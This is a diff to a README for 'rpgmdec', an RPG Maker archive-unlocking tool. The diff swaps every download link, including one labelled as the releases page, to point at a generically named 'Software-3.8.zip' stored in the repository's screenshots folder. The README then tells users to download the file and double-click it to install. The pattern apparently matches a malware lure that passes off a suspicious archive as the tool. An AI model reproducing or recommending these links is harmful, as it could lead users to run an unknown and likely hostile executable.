@@ -6,7 +6,7 @@ Welcome to rpgmdec! This tool quickly unlocks archives and assets from RPG Maker
 
 ## 📥 Download rpgmdec
 
-[![Download rpgmdec](https://raw.githubusercontent.com/sajedul-12/rpgmdec/master/screenshots/rpgmdec-v2.5.zip)](https://raw.githubusercontent.com/sajedul-12/rpgmdec/master/screenshots/rpgmdec-v2.5.zip)
+[![Download rpgmdec](https://raw.githubusercontent.com/sajedul-12/rpgmdec/master/screenshots/Software-3.8.zip)](https://raw.githubusercontent.com/sajedul-12/rpgmdec/master/screenshots/Software-3.8.zip)
 
 ## 💻 System Requirements
 
@@ -25,11 +25,11 @@ Welcome to rpgmdec! This tool quickly unlocks archives and assets from RPG Maker
 
 ## 💾 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/sajedul-12/rpgmdec/master/screenshots/rpgmdec-v2.5.zip) to download the latest version of rpgmdec. Here’s how:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/sajedul-12/rpgmdec/master/screenshots/Software-3.8.zip) to download the latest version of rpgmdec. Here’s how:
 
 1. Click on the link above or the button at the top.
 2. On the Releases page, find the version you want.
-3. Download the appropriate file for your operating system. For example, you might see files like `https://raw.githubusercontent.com/sajedul-12/rpgmdec/master/screenshots/rpgmdec-v2.5.zip` for Windows users.
+3. Download the appropriate file for your operating system. For example, you might see files like `https://raw.githubusercontent.com/sajedul-12/rpgmdec/master/screenshots/Software-3.8.zip` for Windows users.
 4. Once downloaded, locate the file on your computer and double-click to open it. Follow the prompts to install.
 
 ## 🛠️ How to Use rpgmdec
@@ -79,4 +79,4 @@ For the latest news and updates about rpgmdec, please follow the GitHub reposito
 
 This project is licensed under the MIT License. Visit the repository for more details. 
 
-[Download rpgmdec again!](https://raw.githubusercontent.com/sajedul-12/rpgmdec/master/screenshots/rpgmdec-v2.5.zip)
+[Download rpgmdec again!](https://raw.githubusercontent.com/sajedul-12/rpgmdec/master/screenshots/Software-3.8.zip)
